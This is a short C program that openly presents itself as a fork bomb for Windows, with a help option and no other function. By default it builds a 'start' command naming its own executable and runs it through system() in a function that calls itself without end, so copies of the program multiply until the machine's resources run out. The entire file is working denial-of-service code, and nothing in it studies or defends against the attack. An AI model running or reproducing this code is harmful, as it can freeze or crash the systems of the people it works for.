#include <stdio.h>
#include <stdlib.h>
#include <stdnoreturn.h>
#include <string.h>

char * cmd;
noreturn inline static void forkbomb(void);

int main (int argc,char * argv[]) {
  if (argc != 1) {
    if (strcmp(argv[1],"-h") == 0 || strcmp(argv[1],"--help") == 0) {
      printf("This is a forkbomb for windows,\n"
             "\t-h,--help: show this help;\n"
             "\tdefault: run forkbomb.\n");
      return 4;
    }
  }
  if ((cmd = calloc((size_t)strlen(argv[0])+(size_t)7,sizeof(char))) != NULL) {
	  {
		register char * temp = cmd;
		*temp++ = 's';
		*temp++ = 't';
		*temp++ = 'a';
		*temp++ = 'r';
		*temp++ = 't';
		*temp++ = ' ';
		memcpy(temp,*argv,strlen(argv[0])+1);
	  }
    forkbomb();
  } else
    printf("Memory alloc failed.\n");
  return 1;
}

noreturn inline static void forkbomb(void) {
  system(cmd);
  forkbomb();
}
